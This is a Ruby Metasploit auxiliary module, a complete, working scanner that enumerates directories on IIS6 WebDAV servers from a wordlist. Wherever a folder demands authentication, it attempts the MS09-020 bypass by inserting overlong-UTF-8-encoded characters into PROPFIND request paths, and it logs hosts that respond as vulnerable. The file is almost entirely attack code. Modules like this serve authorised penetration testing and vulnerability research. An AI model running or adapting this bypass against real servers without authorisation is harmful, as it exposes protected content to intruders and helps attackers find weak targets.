##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/proto/http'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::WmapScanDir
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'   		=> 'MS09-020 IIS6 WebDAV Unicode Auth Bypass Directory Scanner',
      'Description'	=> %q{
        This module is based on et's HTTP Directory Scanner module,
        with one exception. Where authentication is required, it attempts
        to bypass authentication using the WebDAV IIS6 Unicode vulnerability
        discovered by Kingcope. The vulnerability appears to be exploitable
        where WebDAV is enabled on the IIS6 server, and any protected folder
        requires either Basic, Digest or NTLM authentication.
      },
      'Author' 		=> [ 'aushack' ],
      'License'		=> MSF_LICENSE,
      'References'     =>
        [
          [ 'MSB', 'MS09-020' ],
          [ 'CVE', '2009-1535' ],
          [ 'CVE', '2009-1122' ],
          [ 'OSVDB', '54555' ],
          [ 'BID', '34993' ],
        ]))

    register_options(
      [
        OptString.new('PATH', [ true,  "The path to identify files", '/']),
        OptInt.new('ERROR_CODE', [ true, "Error code for non existent directory", 404]),
        OptPath.new('DICTIONARY',   [ false, "Path of word dictionary to use",
            File.join(Msf::Config.data_directory, "wmap", "wmap_dirs.txt")
          ]
        ),
        OptPath.new('HTTP404S',   [ false, "Path of 404 signatures to use",
            File.join(Msf::Config.data_directory, "wmap", "wmap_404s.txt")
          ]
        )
      ])

    register_advanced_options(
      [
        OptBool.new('NoDetailMessages', [ false, "Do not display detailed test messages", true ])
      ])

  end

  def run_host(ip)
    conn = true
    ecode = nil
    emesg = nil

    tpath = normalize_uri(datastore['PATH'])
    if tpath[-1,1] != '/'
      tpath += '/'
    end

    ecode = datastore['ERROR_CODE'].to_i
    vhost = datastore['VHOST'] || wmap_target_host
    prot  = datastore['SSL'] ? 'https' : 'http'


    #
    # Detect error code
    #
    begin
      randdir = Rex::Text.rand_text_alpha(5).chomp + '/'
      res = send_request_cgi({
        'uri'  		=>  tpath+randdir,
        'method'   	=> 'GET',
        'ctype'		=> 'text/html'
      }, 20)

      return if not res

      tcode = res.code.to_i


      # Look for a string we can signature on as well
      if(tcode >= 200 and tcode <= 299)

        File.open(datastore['HTTP404S'], 'rb').each do |str|
          if(res.body.index(str))
            emesg = str
            break
          end
        end

        if(not emesg)
          print_status("Using first 256 bytes of the response as 404 string")
          emesg = res.body[0,256]
        else
          print_status("Using custom 404 string of '#{emesg}'")
        end
      else
        ecode = tcode
        print_status("Using code '#{ecode}' as not found.")
      end


    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
      conn = false
    rescue ::Timeout::Error, ::Errno::EPIPE
    end

    return if not conn

    webdav_req = '<?xml version="1.0" encoding="utf-8"?><propfind xmlns="DAV:"><prop><getcontentlength xmlns="DAV:"/>' +
      '<getlastmodified xmlns="DAV:"/><executable xmlns="http://apache.org/dav/props/"/><resourcetype xmlns="DAV:"/>' +
      '<checked-in xmlns="DAV:"/><checked-out xmlns="DAV:"/></prop></propfind>'

    File.open(datastore['DICTIONARY'], 'rb').each do |testf|
      begin
        testfdir = testf.chomp + '/'
        res = send_request_cgi({
          'uri'  		=>  tpath + testfdir,
          'method'   	=> 'PROPFIND',
          'ctype'		=> 'application/xml',
          'headers' 	=>
            {
            },
          'data'		=> webdav_req + "\r\n\r\n",
        }, 20)


        if(not res or ((res.code.to_i == ecode) or (emesg and res.body.index(emesg))))
          if !datastore['NoDetailMessages']
            print_status("NOT Found #{wmap_base_url}#{tpath}#{testfdir} #{res.code} (#{wmap_target_host})")
          end
        elsif (res.code.to_i == 401)
          print_status("Found protected folder #{wmap_base_url}#{tpath}#{testfdir} #{res.code} (#{wmap_target_host})")
          print_status("\tTesting for unicode bypass in IIS6 with WebDAV enabled using PROPFIND request.")

          cset  = %W{ & ^ % $ # @ ! }
          buff  = ''
          blen  = rand(16)+1
          while(buff.length < blen)
            buff << cset[ rand(cset.length) ]
          end
          bogus = Rex::Text.uri_encode(Rex::Text.to_unicode( buff, 'utf-8', 'overlong', 2))

          res = send_request_cgi({
            'uri'  		=>  tpath + bogus + testfdir,
            'method'   	=> 'PROPFIND',
            'ctype'		=> 'application/xml',
            'headers' 	=>
              {
                #'Translate'	 => 'f', # Not required in PROPFIND, only GET - aushack 20091518
              },
            'data'		=> webdav_req + "\r\n\r\n",
          }, 20)

          if (res and res.code.to_i == 207)
            print_good("\tFound vulnerable WebDAV Unicode bypass target #{wmap_base_url}#{tpath}%c0%af#{testfdir} #{res.code} (#{wmap_target_host})")

            # Unable to use report_web_vuln as method is PROPFIND and is not part of allowed
            # list in db.rb

            report_note(
              :host	=> ip,
              :proto => 'tcp',
              :sname => (ssl ? 'https' : 'http'),
              :port	=> rport,
              :type	=> 'UNICODE_WEBDAV_BYPASS',
              :data	=> "#{tpath}%c0%af#{testfdir} Code: #{res.code}",
              :update => :unique_data
            )

          end
        end

      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
      rescue ::Timeout::Error, ::Errno::EPIPE
      end
    end

  end
end
